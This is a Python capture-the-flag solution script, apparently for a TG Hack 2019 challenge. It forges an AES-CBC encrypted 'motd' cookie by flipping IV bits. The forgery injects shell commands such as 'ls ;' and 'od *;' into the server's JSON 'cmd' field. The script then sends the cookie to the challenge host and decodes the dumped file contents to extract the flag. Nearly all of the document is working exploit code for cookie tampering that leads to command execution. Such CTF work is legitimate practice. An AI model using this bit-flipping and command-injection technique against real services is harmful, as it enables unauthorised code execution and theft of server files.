from base64 import b64decode, b64encode
from binascii import hexlify
from hashlib import md5
from Crypto.Cipher import AES
from Crypto import Random
import os
import subprocess
import requests
from bs4 import BeautifulSoup
import re

#Motd extracted from chrome, must be changed if the secret key is changed
motd = "0duSaqOSkgmu8BPSALSp3V9bOKJZ3HmuzlCcMddW94vjHWPjVrpHkB46IISXZpDFpd19cMLCRiqUZI+NmK7kmpcmsd4y3If/27AMA/hHQ9wfJMu4WOs8FPBCMdGLq3ahJWNNV/qPDQNa4k2szCIdPQ=="

BLOCK_SIZE = 16
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

class AESCipher:
    """
    Usage:
        c = AESCipher('password').encrypt('message')
        m = AESCipher('password').decrypt(c)
    Tested under Python 3 and PyCrypto 2.6.1.
    """

    def __init__(self, key):
        self.key = md5(key.encode('utf8')).hexdigest()
        self.iv = "\x00" * BLOCK_SIZE

    def encrypt(self, raw):
        raw = pad(raw)
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        return b64encode(cipher.encrypt(raw))

    def decrypt(self, enc):
        enc = b64decode(enc)
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        return unpad(cipher.decrypt(enc)) #.decode('utf8')

# https://ctftime.org/writeup/11811
def xor(a, b):
    """
    return a bytearray constructed by XORing a and b
    """
    out = bytearray()
    for i,c in enumerate(a):
        out.append(c ^ b[i])
    return bytes(out)


def construct_cookie(cookie_value):
    # current and desired plaintext, obtained by observing the cookie
    current_plaintext = bytearray('{"cmd": "echo \\"', 'utf8')
    desired_plaintext = bytearray('{"cmd": "pwd ;\\"', 'utf8')
    desired_plaintext = bytearray('{"cmd": "ls ; \\"', 'utf8')
    desired_plaintext = bytearray('{"cmd": "od *;\\"', 'utf8')
    #desired_plaintext = bytearray('{"cmd": "cat *; ', 'utf8')

    # base64-decode the cookie value
    decoded_cookie = b64decode(cookie_value)
    # split the IV and the message
    original_iv = decoded_cookie[:16]
    # construct the mask for the first block
    desired_iv = xor(xor(desired_plaintext, current_plaintext), bytearray(original_iv))
    # prepend the new IV to the original ciphertext
    altered_ciphertext = desired_iv+decoded_cookie[16:]
    # base64-encode the cookie value
    cookie = b64encode(altered_ciphertext).decode("utf8")
    return cookie


cookie = construct_cookie(motd)
cookies = dict(motd=cookie)
#r = requests.get('http://127.0.0.1:5000/motd', cookies=cookies)
r = requests.get('https://awesome.tghack.no/motd', cookies=cookies)
print(r.status_code)
print("Response:")

soup = BeautifulSoup(r.text, "html.parser")
text = re.sub(r'\n\s*\n', r'\n\n', soup.get_text().strip(), flags=re.M)
print(text)

def od_to_str(word):
    lol = int(word, 8)
    #print("{} => {}".format(oct(lol), hex(lol)))
    #rofl = "{:04x}".format(lol)
    two = chr((lol >> 8) & 0xff)
    one = chr((lol >> 0) & 0xff)
    s = one
    s += two

    return s


# parse the output from od
text = text.split("\n")
orig = ""
for line in text:
    #print(line)
    tmp = line.split(" ")
    if tmp[0].isdigit():
        for word in tmp[1:]:
            orig += od_to_str(word)

#print(orig)
idx = orig.find("TG19")
if idx == -1:
    print("Couldn't find flag in output :(")
else:
    flag = orig[idx:]
    end = flag.find("}") + 1
    print("end: {}".format(end))
    print("flag: {}".format(flag[:end]))
